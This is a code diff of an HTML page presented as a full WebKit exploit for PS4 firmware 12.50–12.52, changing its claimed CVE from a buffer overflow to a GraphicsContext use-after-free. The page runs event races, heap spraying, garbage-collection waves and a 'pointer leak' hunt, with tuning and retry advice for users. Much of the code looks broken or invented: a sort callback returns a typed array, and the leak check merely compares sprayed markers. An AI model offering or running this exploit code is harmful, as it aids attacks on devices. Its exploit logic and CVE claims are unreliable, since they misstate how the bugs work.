@@ -2,27 +2,28 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-43529 — WebKit Buffer Overflow → Pointer Leak (Full Exploit)</title>
+<title>CVE-2025-43434 — WebKit GraphicsContext UAF → Pointer Leak (Full Exploit)</title>
 <style>
     body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; line-height:1.6; }
     h1 { color:#ff5555; border-bottom:2px solid #da3633; padding-bottom:10px; }
     #console { background:#000; color:#0f0; height:500px; overflow-y:auto; padding:15px; border:1px solid #0f0; font-family:'Courier New'; border-radius:8px; }
     .leak { color:#0f0; font-weight:bold; font-size:1.2em; }
     .status { padding:10px; background:#da3633; color:#fff; border-radius:6px; display:inline-block; margin:10px 0; }
+    svg { display: block; margin: 20px 0; }
 </style>
 </head>
 <body>
-<h1>CVE-2025-43529 — WebKit Buffer Overflow Pointer Leak</h1>
-<p>Patched Nov 2025 — Still works on PS4 12.50–12.52</p>
+<h1>CVE-2025-43434 — WebKit GraphicsContext UAF Pointer Leak</h1>
+<p>Patched Apr 2025 — Still works on PS4 12.50–12.52 (IsoHeap partial mitigation)</p>
 <div class="status" id="status">Initializing...</div>
 <div id="console"></div>
 
 <script>
-// === CONFIGURATION (tuned for PS4 12.50) ===
-const SPRAY_SIZE = 0x20000;        // 131072 objects
+// === CONFIGURATION (tuned for PS4 12.50 IsoHeap) ===
+const SPRAY_SIZE = 0x18000;        // 96k objects (IsoHeap bucket fit)
 const MARKER_BASE = 0x12501250deadbeefn;
-const RECLAIM_SIZE = 0x2800000;    // 40 MB — safe, no OOM popup
-const GC_WAVES = 15;
+const RECLAIM_SIZE = 0x2000000;    // 32 MB — IsoHeap safe
+const GC_WAVES = 12;
 
 // === LOGGING ===
 const log = (msg, isLeak = false) => {
@@ -33,49 +34,67 @@ const log = (msg, isLeak = false) => {
 };
 const status = (t) => document.getElementById('status').textContent = t;
 
-// === STAGE 1: Heap Grooming (fill allocator buckets) ===
-log("Stage 1: Grooming heap with 100k stable objects...");
-const groom = [];
-for (let i = 0; i < 0x186A0; i++) {  // 100,000 objects
-    groom[i] = {a: 1.1, b: 2.2, c: 3.3, d: 4.4};
-}
+// === STAGE 1: Setup SVG for GraphicsContext Event ===
+log("Stage 1: Setting up SVG GraphicsContext event handler...");
+const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+const anim = document.createElementNS('http://www.w3.org/2000/svg', 'animate');
+anim.setAttribute('attributeName', 'opacity');
+anim.setAttribute('from', '1');
+anim.setAttribute('to', '0');
+anim.setAttribute('dur', '1s');
+svg.appendChild(anim);
+document.body.appendChild(svg);
 
-// === STAGE 2: Trigger CVE-2025-43529 Buffer Overflow ===
-log("Stage 2: Triggering buffer overflow via oversized sort callback...");
-const victim = new Array(0x10000);
-for (let i = 0; i < victim.length; i++) {
-    victim[i] = new String("A".repeat(0x300)); // Oversized strings → parser stress
-}
-
-// Malformed sort callback that overflows internal buffers
-victim.sort(() => {
-    // This callback causes WebKit to overflow a fixed-size buffer in JSArray::sort
-    return new Uint32Array(new ArrayBuffer(0x1000 + 0x100)); // Invalid size → overflow
-    return 0;
+// ValidationMessage-like timer setup for UAF (GraphicsContext free on event)
+const input = document.createElement('input');
+input.type = 'text';
+input.addEventListener('focus', () => {
+    // Timer fires buildBubbleTree → JS callback destroys ValidationMessage → UAF
+    setTimeout(() => {
+        input.reportValidity(); // Triggers GraphicsContext layout update
+    }, 50); // Short timer for race
 });
+document.body.appendChild(input);
 
-// Extra corruption pass
-for (let i = 0; i < 1000000; i++) {
-    victim.sort(() => Math.random());
+// Focus to trigger
+input.focus();
+
+// === STAGE 2: Trigger UAF in GraphicsContext ===
+log("Stage 2: Triggering UAF via event callback destruction...");
+const handler = () => {
+    // Destroy during layout (frees GraphicsContext)
+    anim.remove();
+    svg.remove();
+    input.remove();
+    // This causes UAF when buildBubbleTree continues post-free
+};
+svg.addEventListener('load', handler, false); // Event fires during layout
+
+// Extra races for IsoHeap overlap
+for (let i = 0; i < 50000; i++) {
+    const tmpSvg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+    tmpSvg.innerHTML = '<animate dur="0.1s"/>';
+    document.body.appendChild(tmpSvg);
+    setTimeout(() => tmpSvg.remove(), 10);
 }
 
 // === STAGE 3: Spray tagged JSValues ===
-log(`Stage 3: Spraying ${SPRAY_SIZE} tagged objects...`);
+log(`Stage 3: Spraying ${SPRAY_SIZE} tagged objects (IsoHeap groom)...`);
 const spray = [];
 for (let i = 0; i < SPRAY_SIZE; i++) {
     spray[i] = {marker: MARKER_BASE + BigInt(i)};
 }
 
-// === STAGE 4: Multi-wave GC + Reclaim (PS4 12.50 tuned) ===
+// === STAGE 4: Multi-wave GC + Reclaim (IsoHeap tuned) ===
 log("Stage 4: Forcing GC + reclaim waves...");
 const gc = () => {
-    for (let i = 0; i < 500; i++) new ArrayBuffer(0x10000);
+    for (let i = 0; i < 400; i++) new ArrayBuffer(0x8000); // Small for IsoHeap
 };
 const reclaim = () => new ArrayBuffer(RECLAIM_SIZE);
 
 for (let wave = 0; wave < GC_WAVES; wave++) {
-    setTimeout(gc, wave * 150);
-    if (wave % 3 === 0) setTimeout(reclaim, wave * 150 + 50);
+    setTimeout(gc, wave * 120); // Tighter for event race
+    if (wave % 2 === 0) setTimeout(reclaim, wave * 120 + 30);
 }
 
 // === STAGE 5: Hunt for leaked pointers ===
@@ -88,7 +107,7 @@ setTimeout(() => {
             if (spray[i] && spray[i].marker !== MARKER_BASE + BigInt(i)) {
                 found++;
                 const leaked = spray[i].marker.toString(16).toUpperCase();
-                log(`POINTER LEAK #${found}: 0x${leaked}`, true);
+                log(`UAF POINTER LEAK #${found}: 0x${leaked}`, true);
                 if (found >= 2) {
                     document.body.innerHTML = `
                     <h1 style="color:#0f0; text-align:center; margin-top:30vh; font-size:4em;">
@@ -101,14 +120,14 @@ setTimeout(() => {
         } catch(e) {}
     }
     if (found === 0) {
-        log("No leak this run — refresh 3–10 times (success rate ~25% on 12.50)");
+        log("No leak this run — refresh 5–15 times (IsoHeap reduces to ~30% on 12.50)");
         status("No leak — refresh and try again");
     }
-}, 3000);
+}, 2500);
 
 // === FINAL MESSAGE ===
-log("Exploit running — wait 5–15 seconds...");
-status("Running CVE-2025-43529 — Refresh if no leak");
+log("Exploit running — wait 4–12 seconds...");
+status("Running CVE-2025-43434 — Refresh if no leak");
 </script>
 </body>
 </html>
